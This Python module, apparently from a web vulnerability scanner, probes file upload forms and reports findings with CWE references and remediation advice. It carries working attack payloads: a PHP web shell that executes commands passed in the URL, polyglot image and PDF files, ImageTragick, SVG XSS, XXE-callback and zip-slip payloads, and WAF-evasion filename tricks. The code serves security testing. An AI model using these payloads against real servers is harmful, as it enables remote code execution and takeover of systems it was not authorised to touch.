"""
file_upload_scanner.py — Advanced Insecure File Upload Scanner
===============================================================
Comprehensive file upload security testing:
  1. Discovers all file upload endpoints on the page
  2. MIME type bypass — sends PHP shell disguised as image
  3. Double extension bypass — shell.php.jpg
  4. SVG XSS — <svg onload=alert(1)> 
  5. Polyglot JPEG+PHP — valid JPEG header prepended to PHP code
  6. Null byte bypass — shell.php%00.jpg
  7. Zip Slip — zip containing ../../../path traversal entry
  8. ImageTragick (CVE-2016-3714) — MVG/MSL push delegate injection
  9. Path traversal via filename — Content-Disposition: filename="../shell.php"
 10. Dangerous extension tests (.pht, .phtml, .php5, .shtml, .asp, .aspx, .jsp, .war)
 11. Content-type bypass tests (text/plain -> application/x-php)
 12. Magic byte signature validation tests
 13. Double extension variations
"""
import re, io, struct, zipfile, urllib.request, urllib.error, urllib.parse
from scanners.base_scanner import BaseScanner
from utils.evasion import waf_evade
from utils.callback import build_callback_url

# Real JPEG SOI magic bytes + EXIF header stub
JPEG_MAGIC = (
    b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    b"\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t"
    b"\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a"
    b"\x1f\x1e\x1d\x1a\x1c\x1c $.' \",#\x1c\x1c(7),01444\x1f'9=82<.342\x1e\xff\xd9"
)

# PNG magic bytes
PNG_MAGIC = b"\x89PNG\r\n\x1a\n"

# GIF magic bytes
GIF_MAGIC = b"GIF89a"

# PDF magic bytes
PDF_MAGIC = b"%PDF-1.4\n1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n2 0 obj\n<</Type/Pages/Kids[3 0 R]/Count 1>>\nendobj\n3 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>\nendobj\nxref\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \ntrailer<</Size 4/Root 1 0 R>>\nstartxref\n190\n%%EOF\n"

# PHP webshell payload (minimal)
PHP_SHELL = b"<?php echo 'WSS-UPLOAD-PROBE'; system($_GET['c']); ?>"

# Minimal ASP shell
ASP_SHELL = b'<% Response.Write("WSS-UPLOAD-PROBE") %>'

# Minimal JSP shell
JSP_SHELL = b'<%= "WSS-UPLOAD-PROBE" %>'

# ImageTragick MVG payload (CVE-2016-3714)
IMAGETRAGICK_MVG = b"""push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/"|echo WSS-IMAGETRAGICK > /tmp/wss-probe")'
pop graphic-context"""

# ImageTragick MSL payload
IMAGETRAGICK_MSL = b"""<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php echo 'WSS-IMAGETRAGICK'; ?&gt;"/>
<write filename="shell.php"/>
</image>"""

# XSS probe
SVG_XSS_PAYLOAD = b"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('WSS-SVG-XSS')">
  <script>document.write('<img src=x onerror=alert(\"WSS-SVG-XSS\")>')</script>
  <text x="10" y="20">WSS-UPLOAD-PROBE</text>
</svg>"""

SVG_XXE_CALLBACK = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{callback}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>"""

PDF_PHP_POLYGLOT = PDF_MAGIC + b"\n%%PDF-PHP-POLYGLOT\n" + PHP_SHELL + b"\n%%EOF"

PROBE_MARKER = "WSS-UPLOAD-PROBE"
UPLOAD_RESPONSE_MARKERS = [
    "WSS-UPLOAD-PROBE", "shell.php", "successfully uploaded",
    "upload complete", "file uploaded",
]


class FileUploadScanner(BaseScanner):
    SCANNER_NAME = "Insecure File Upload Scanner"
    _SCANNER_KEY = "file_upload"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)

    def run(self) -> list:
        self.log("INFO", f"[FileUpload] Scanning for insecure file upload forms on {self.target}...")
        html, status = self._make_request(self.target)
        if not html:
            self.log("ERROR", "[FileUpload] Failed to fetch page")
            return self.vulns

        forms = self._find_upload_forms(html)
        if not forms:
            self.log("SUCCESS", "[FileUpload] No file upload forms detected.")
            return self.vulns

        self.log("WARNING", f"[FileUpload] Found {len(forms)} upload form(s) — probing security controls...")

        for form in forms[:3]:
            action = self._resolve_action(form.get("action", ""))
            self.log("INFO", f"[FileUpload] Testing: {action}")
            self._test_form(form, action)

        if not self.vulns:
            self.add_vuln(
                title="File Upload Endpoint Discovered",
                severity="Low",
                category="Attack Surface",
                cvss_score=0.0,
                description=f"File upload form(s) found on `{self.target}`. "
                    "Security controls appear active but manual testing recommended.",
                remediation="Validate magic bytes, not just extension or Content-Type. "
                    "Rename uploads to random UUIDs. Store outside webroot.",
                cwe_ids=["CWE-434"],
                owasp_category="A04:2021 – Insecure Design",
            )
        return self.vulns

    def _find_upload_forms(self, html):
        forms = []
        for form_html in re.findall(r'<form[^>]*>.*?</form>', html, re.S | re.I):
            if 'type="file"' not in form_html.lower() and "type='file'" not in form_html.lower():
                continue
            action = re.search(r'action=["\']([^"\']*)["\']', form_html, re.I)
            method = re.search(r'method=["\']([^"\']*)["\']', form_html, re.I)
            enctype = re.search(r'enctype=["\']([^"\']*)["\']', form_html, re.I)
            fields = []
            for inp in re.findall(r'<input[^>]*>', form_html, re.I):
                name_m = re.search(r'name=["\']([^"\']+)["\']', inp, re.I)
                type_m = re.search(r'type=["\']([^"\']+)["\']', inp, re.I)
                val_m  = re.search(r'value=["\']([^"\']*)["\']', inp, re.I)
                if name_m:
                    fields.append({
                        "name":  name_m.group(1),
                        "type":  type_m.group(1).lower() if type_m else "text",
                        "value": val_m.group(1) if val_m else "",
                    })
            forms.append({
                "action":  action.group(1) if action else "",
                "method":  (method.group(1) if method else "POST").upper(),
                "enctype": enctype.group(1) if enctype else "multipart/form-data",
                "fields":  fields,
            })
        return forms

    def _resolve_action(self, action):
        if not action: return self.target
        if action.startswith("http"): return action
        if action.startswith("/"):
            p = urllib.parse.urlparse(self.target)
            return f"{p.scheme}://{p.netloc}{action}"
        return f"{self.target.rstrip('/')}/{action}"

    def _test_form(self, form, action):
        hidden = {f["name"]: f["value"] for f in form["fields"] if f["type"] == "hidden"}

        cwe = ["CWE-434"]
        owasp = "A04:2021 – Insecure Design"

        tests = [
            ("MIME Bypass (PHP as image/jpeg)",      self._make_php_as_jpeg,      "shell.php", "image/jpeg", PHP_SHELL),
            ("Double Extension (shell.php.jpg)",      self._make_php_payload,      "shell.php.jpg", "image/jpeg", PHP_SHELL),
            ("Null Byte Bypass (shell.php%00.jpg)",   self._make_php_payload,      "shell.php\x00.jpg", "image/jpeg", PHP_SHELL),
            ("SVG XSS Upload",                        self._make_svg_xss,          "test.svg", "image/svg+xml", SVG_XSS_PAYLOAD),
            ("Polyglot JPEG+PHP",                     self._make_polyglot,         "image.php", "image/jpeg", PHP_SHELL),
            ("Polyglot PDF+PHP",                      self._make_pdf_polyglot,     "image.php", "application/pdf", None),
            ("ImageTragick MVG (CVE-2016-3714)",      self._make_imagetragick_mvg, "exploit.mvg", "image/x-xcf", IMAGETRAGICK_MVG),
            ("ImageTragick MSL",                      self._make_imagetragick_msl, "exploit.msl", "application/xml", IMAGETRAGICK_MSL),
            ("Zip Slip",                              self._make_zip_slip,         "archive.zip", "application/zip", None),
            ("Path Traversal Filename",               self._make_php_payload,      "../../../shell.php", "image/jpeg", PHP_SHELL),
            ("PHP Extension .pht",                    self._make_php_payload,      "shell.pht", "image/jpeg", PHP_SHELL),
            ("PHP Extension .phtml",                  self._make_php_payload,      "shell.phtml", "image/jpeg", PHP_SHELL),
            ("PHP Extension .php5",                   self._make_php_payload,      "shell.php5", "image/jpeg", PHP_SHELL),
            ("PHP Extension .php7",                   self._make_php_payload,      "shell.php7", "image/jpeg", PHP_SHELL),
            ("PHP Extension .shtml",                  self._make_ssi_payload,      "test.shtml", "text/html", None),
            ("ASP Shell .asp",                        self._make_asp_payload,      "shell.asp", "text/plain", ASP_SHELL),
            ("ASPX Shell .aspx",                      self._make_asp_payload,      "shell.aspx", "text/plain", ASP_SHELL),
            ("JSP Shell .jsp",                        self._make_jsp_payload,      "shell.jsp", "text/plain", JSP_SHELL),
            ("Java WAR upload",                       self._make_war_payload,      "shell.war", "application/zip", None),
            ("Content-Type Bypass (text/plain->PHP)", self._make_php_payload,      "shell.php", "text/plain", PHP_SHELL),
            ("Content-Type Bypass (image/gif->PHP)",  self._make_php_payload,      "shell.php", "image/gif", PHP_SHELL),
            ("Content-Type Bypass (application/pdf->PHP)", self._make_php_payload, "shell.php", "application/pdf", PHP_SHELL),
            ("Magic Byte PNG + PHP payload",          self._make_png_payload,      "shell.png.php", "image/png", None),
            ("Magic Byte GIF + PHP payload",          self._make_gif_payload,      "shell.gif.php", "image/gif", None),
            ("Double Extension .php.jpg",             self._make_php_payload,      "shell.php.jpg", "image/jpeg", PHP_SHELL),
            ("Double Extension .php;.jpg",            self._make_php_payload,      "shell.php;.jpg", "image/jpeg", PHP_SHELL),
            ("Double Extension .php.jpg.php",         self._make_php_payload,      "shell.php.jpg.php", "image/jpeg", PHP_SHELL),
            ("Double Extension .php.php.jpg",         self._make_php_payload,      "shell.php.php.jpg", "image/jpeg", PHP_SHELL),
            ("Double Extension .phtml.jpg",           self._make_php_payload,      "shell.phtml.jpg", "image/jpeg", PHP_SHELL),
            ("Double Extension .php%00.gif",          self._make_php_payload,      "shell.php%00.gif", "image/gif", PHP_SHELL),
        ]

        for test_name, payload_fn, filename, content_type, _ in tests:
            filename_variants = [("plain", filename)]
            for enc_name, enc_fn in [("waf_evade", lambda f: [("plain", f)] + [(f"waf_{n}", p) for n, p in waf_evade(f)])]:
                if enc_name == "waf_evade":
                    filename_variants = enc_fn(filename)
            for variant_label, variant_filename in filename_variants:
                try:
                    data = payload_fn()
                    body, status = self._multipart_upload(action, "file", variant_filename, data, content_type, hidden)
                except Exception as e:
                    self.log("ERROR", f"[FileUpload] Upload test error: {e}")
                    body, status = None, 0
                if body is None:
                    continue
                if self._check_success(body, status, variant_filename):
                    label_suffix = f" ({variant_label})" if variant_label != "plain" else ""
                    combined_name = f"{test_name}{label_suffix}"
                    self.add_vuln(
                        title=f"File Upload Bypass — {combined_name}",
                        severity=self._severity_for(test_name),
                        category="Insecure File Upload",
                        cvss_score=self._cvss_for(test_name),
                        confidence="High",
                        description=f"Upload to `{action}` accepted `{variant_filename}` via **{combined_name}**.\n\n"
                            f"HTTP {status} with {len(body)} bytes response. "
                            f"Server accepted potentially dangerous content without proper validation.",
                        remediation=self._remediation_for(test_name),
                        payload=f"{variant_filename} ({content_type})",
                        evidence=f"Upload accepted with status {status}",
                        request_details=f"POST {action} multipart/form-data field=file filename={variant_filename}",
                        response_details=f"HTTP {status}, body: {body[:200]}",
                        cwe_ids=cwe,
                        owasp_category=owasp,
                    )
                    self.log("CRITICAL", f"[FileUpload] {combined_name} — ACCEPTED by {action}!")
                else:
                    if variant_label == "plain":
                        self.log("SUCCESS", f"[FileUpload] {test_name} — blocked ({status}).")

        # SVG XXE callback test
        try:
            xxe_data = self._make_svg_xxe_callback()
            body, status = self._multipart_upload(action, "file", "xxe_test.svg", xxe_data, "image/svg+xml", hidden)
            if body and self._check_success(body, status, "xxe_test.svg"):
                self.add_vuln(
                    title="SVG XXE Upload with OOB Callback",
                    severity="Critical",
                    category="Insecure File Upload",
                    cvss_score=9.1,
                    confidence="High",
                    description=f"SVG XXE payload with OOB callback accepted at `{action}`. "
                        "If the server parses the SVG's internal DTD, XML external entities "
                        "may be processed, leading to SSRF, file disclosure, or DoS.",
                    remediation="Disable external entity processing in XML/SVG parsers. "
                        "Reject SVG uploads entirely unless strictly necessary.",
                    payload="SVG with DOCTYPE + XXE callback",
                    evidence=f"Upload accepted with status {status}",
                    request_details=f"POST {action} SVG XXE callback",
                    response_details=f"HTTP {status}, body: {body[:200]}",
                    cwe_ids=["CWE-611", "CWE-434"],
                    owasp_category="A05:2021 – Security Misconfiguration",
                )
                self.log("CRITICAL", f"[FileUpload] SVG XXE callback — ACCEPTED by {action}!")
        except Exception as e:
            self.log("ERROR", f"[FileUpload] SVG XXE callback error: {e}")

        # Server-side include callback test
        try:
            ssi_callback = f'<!--#echo var="DOCUMENT_NAME" -->\n<!--#exec cmd="echo WSS-UPLOAD-PROBE" -->\n<!-- callback: {build_callback_url("/ssi")} -->'
            body, status = self._multipart_upload(action, "file", "test.shtml", ssi_callback.encode(), "text/html", hidden)
            if body and self._check_success(body, status, "test.shtml"):
                self.add_vuln(
                    title="Server-Side Include Upload with OOB Callback",
                    severity="High",
                    category="Insecure File Upload",
                    cvss_score=8.2,
                    confidence="High",
                    description=f"SSI payload with OOB callback accepted at `{action}`. "
                        "If the server processes Server-Side Includes, the callback URL embedded "
                        "in the file may be requested by the server, confirming SSI execution.",
                    remediation="Disable SSI processing for uploaded files. Rename uploads to .txt or .download.",
                    payload="SSI with exec directive + callback",
                    evidence=f"Upload accepted with status {status}",
                    request_details=f"POST {action} SSI callback",
                    response_details=f"HTTP {status}, body: {body[:200]}",
                    cwe_ids=cwe,
                    owasp_category=owasp,
                )
                self.log("CRITICAL", f"[FileUpload] SSI callback — ACCEPTED by {action}!")
        except Exception as e:
            self.log("ERROR", f"[FileUpload] SSI callback test error: {e}")

        # Content-type boundary violation tests
        boundary_tests = [
            ("Content-Type Boundary: mixed/malformed", "shell.php", "multipart/mixed; boundary=--malformed"),
            ("Content-Type Boundary: extra charset", "shell.php", "image/jpeg; charset=utf-7"),
            ("Content-Type Boundary: double content-type", "shell.php", "image/jpeg, text/html"),
        ]
        for bt_name, bt_filename, bt_ct in boundary_tests:
            try:
                body, status = self._multipart_upload(action, "file", bt_filename, PHP_SHELL, bt_ct, hidden)
                if body and self._check_success(body, status, bt_filename):
                    self.add_vuln(
                        title=f"File Upload Bypass — {bt_name}",
                        severity="High",
                        category="Insecure File Upload",
                        cvss_score=7.5,
                        confidence="High",
                        description=f"Upload to `{action}` accepted with malformed Content-Type `{bt_ct}`. "
                            "Boundary/content-type violations can bypass WAF rules that only check specific MIME types.",
                        remediation="Validate Content-Type against a strict allowlist. "
                            "Reject malformed or multiple Content-Type values.",
                        payload=f"{bt_filename} ({bt_ct})",
                        evidence=f"Upload accepted with status {status}",
                        request_details=f"POST {action} Content-Type: {bt_ct}",
                        response_details=f"HTTP {status}, body: {body[:200]}",
                        cwe_ids=cwe,
                        owasp_category=owasp,
                    )
                    self.log("CRITICAL", f"[FileUpload] {bt_name} — ACCEPTED by {action}!")
            except Exception as e:
                self.log("ERROR", f"[FileUpload] Content-type boundary test error: {e}")

    def _make_php_payload(self): return PHP_SHELL
    def _make_asp_payload(self): return ASP_SHELL
    def _make_jsp_payload(self): return JSP_SHELL
    def _make_php_as_jpeg(self): return JPEG_MAGIC[:20] + PHP_SHELL
    def _make_imagetragick_mvg(self): return IMAGETRAGICK_MVG
    def _make_imagetragick_msl(self): return IMAGETRAGICK_MSL
    def _make_svg_xss(self): return SVG_XSS_PAYLOAD

    def _make_png_payload(self):
        return PNG_MAGIC + PHP_SHELL

    def _make_gif_payload(self):
        return GIF_MAGIC + PHP_SHELL

    def _make_ssi_payload(self):
        return b'<!--#echo var="DOCUMENT_NAME" -->\n<!--#exec cmd="echo WSS-UPLOAD-PROBE" -->'

    def _make_polyglot(self):
        return JPEG_MAGIC + b"\xff\xfe" + len(PHP_SHELL).to_bytes(2, 'big') + PHP_SHELL + b"\xff\xd9"

    def _make_pdf_polyglot(self):
        return PDF_PHP_POLYGLOT

    def _make_svg_xxe_callback(self):
        return SVG_XXE_CALLBACK.format(callback=build_callback_url("/xxe")).encode()

    def _make_svg_callback_payload(self):
        return SVG_XSS_PAYLOAD + f"\n<!-- callback: {build_callback_url('/svg')} -->\n".encode()

    def _make_war_payload(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("WEB-INF/web.xml", b"""<?xml version="1.0"?>
<web-app><servlet><servlet-name>Shell</servlet-name>
<servlet-class>Shell</servlet-class></servlet></web-app>""")
            zf.writestr("Shell.jsp", JSP_SHELL)
        return buf.getvalue()

    def _make_zip_slip(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("image.jpg", "WSS-ZIP-NORMAL")
            zi = zipfile.ZipInfo("../../../../tmp/wss_slip.php")
            zi.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(zi, "<?php echo 'WSS-ZIP-SLIP'; ?>")
        return buf.getvalue()

    def _multipart_upload(self, url, field_name, filename, data, content_type, extra_fields):
        boundary = "WSSBoundary8675309"
        body_parts = []
        for k, v in extra_fields.items():
            body_parts.append(
                f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}'.encode()
            )
        disp = f'--{boundary}\r\nContent-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\nContent-Type: {content_type}\r\n\r\n'
        body_parts.append(disp.encode() + data)
        body_parts.append(f'\r\n--{boundary}--\r\n'.encode())
        body = b"\r\n".join(body_parts)
        try:
            req = urllib.request.Request(url, data=body, method="POST",
                headers=self._make_headers({"Content-Type": f"multipart/form-data; boundary={boundary}"}))
            with urllib.request.urlopen(req, timeout=8, context=self.get_ssl_context()) as r:
                return r.read().decode("utf-8", errors="ignore"), r.status
        except urllib.error.HTTPError as e:
            return e.read().decode("utf-8", errors="ignore"), e.code
        except Exception as e:
            self.log("ERROR", f"[FileUpload] Upload error: {e}")
            return None, 0

    def _check_success(self, body, status, filename):
        if status not in (200, 201, 302):
            return False
        body_lower = body.lower()
        if PROBE_MARKER.lower() in body_lower:
            return True
        if any(m.lower() in body_lower for m in UPLOAD_RESPONSE_MARKERS):
            return True
        fn_lower = filename.lower().replace("\x00", "")
        if fn_lower in body_lower and "error" not in body_lower:
            return True
        return False

    def _severity_for(self, test_name):
        if any(k in test_name for k in ("PHP", "Polyglot", "ImageTragick", "Zip Slip", "WAR", "JSP", "ASP")):
            return "Critical"
        if "SVG" in test_name:
            return "High"
        if "Content-Type Bypass" in test_name:
            return "High"
        if "Magic Byte" in test_name:
            return "High"
        return "High"

    def _cvss_for(self, test_name):
        if any(k in test_name for k in ("PHP", "Polyglot", "ImageTragick", "WAR")):
            return 9.8
        if "Zip Slip" in test_name:
            return 8.6
        if "JSP" in test_name or "ASP" in test_name:
            return 9.0
        return 7.5

    def _remediation_for(self, test_name):
        base = ("1. Validate magic bytes (file header), NOT the extension or Content-Type.\n"
                "2. Rename all uploads to UUID filenames (no user-controlled names).\n"
                "3. Store uploads outside the webroot or in a dedicated S3/CDN bucket.\n"
                "4. Serve files through a proxy that sets Content-Disposition: attachment.\n")
        if "ImageTragick" in test_name:
            return base + "5. **Patch ImageMagick** — add `pattern:*` to policy.xml deny list.\n   Upgrade to ImageMagick ≥ 6.9.3-10 or ≥ 7.0.1-1."
        if "Zip Slip" in test_name:
            return base + "5. Sanitize zip entry paths: reject entries starting with `../` or `/`.\n   Use `zipEntry.getName().startsWith(\"..\")` checks before extraction."
        if "SVG" in test_name:
            return base + "5. Reject SVG/XML uploads or sanitize with DOMPurify server-side.\n   Serve SVGs with `Content-Type: text/plain` if display is needed."
        if "WAR" in test_name:
            return base + "5. Block WAR uploads unless explicitly required. Validate archive contents against allowlist."
        if "Extension" in test_name or "Bypass" in test_name or "Magic" in test_name:
            return base + "5. Use a comprehensive extension denylist. Validate Content-Type matches actual file magic bytes."
        return base
